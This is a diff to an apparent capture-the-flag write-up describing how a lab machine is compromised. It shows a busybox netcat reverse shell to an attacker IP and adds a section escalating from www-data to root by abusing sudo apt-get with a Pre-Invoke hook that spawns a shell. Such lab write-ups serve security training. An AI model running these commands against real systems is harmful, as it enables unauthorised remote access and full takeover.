@@ -76,5 +76,20 @@ After several attempts, we can achieve a remote shell using the below busybox co
 
 	busybox nc 192.168.XXX.XXX 80 -e /bin/bash
 
+We have now successfully logged into the remote machine as the user, "www-data."
+
 
 # Privilege Escalation
+
+With a foothold on the target machine we can now evaluate common privilege escalation points of vulnerability. 
+
+Luckily, the currently logged in user is able to run the *apt-get* command with super user privileges. 
+
+On GTFOBins, we can find useful privilege escaltion examples using the *apt-get* command for escaltion.
+
+Specifically, we are looking for the best option that allows us to spawn a shell as the root user.
+
+	sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+
+Success! With the above command, a root shell is spawned. We are now logged in as the root user and the machine is solved! The root flag can be found in the root directory for this machine.
